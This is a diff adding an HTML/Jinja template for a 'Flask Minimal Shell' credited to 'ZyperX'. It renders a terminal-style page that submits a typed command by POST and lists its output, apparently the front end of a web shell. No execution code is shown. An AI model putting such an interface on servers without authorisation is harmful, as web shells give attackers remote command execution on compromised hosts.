@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<style>
+.footer {
+  position: fixed;
+  left: 0;
+  bottom: 0;
+  width: 100%;
+  color: white;
+  text-align: center;
+}
+.header {
+        height: 40px;
+        padding: 20px 20px 0;
+      }
+</style>
+<head>
+	<title>Flask Min Shell</title>
+</head>
+<body bgcolor= "black">
+<div class="header">
+  <em><font color="green">
+  <strong><h2><center>Terminal</center></h2></strong>
+  <hr>
+     <p>Cmd : {{ message }}</p>
+     <p>Output :
+     {% for i in output %}
+      {{i}}</p> 
+  {% endfor %} 
+  <form action="" method="POST">
+	<label for="cmd" >ZyperX $:</label>
+	<input id="cmd" type="text" name="cmd"/>
+	<input type="submit" name="submit"/> 
+ </form>
+ </em>
+</div>
+<div class="footer">
+ <strong><p style="text-align:right">Flask Minimal Shell</p></strong>
+ </font>
+ <font color="red">
+ <p style="text-align:right"><em> Credits : ZyperX!</em></p>
+ </font>
+</div>
+</body>
+</html>
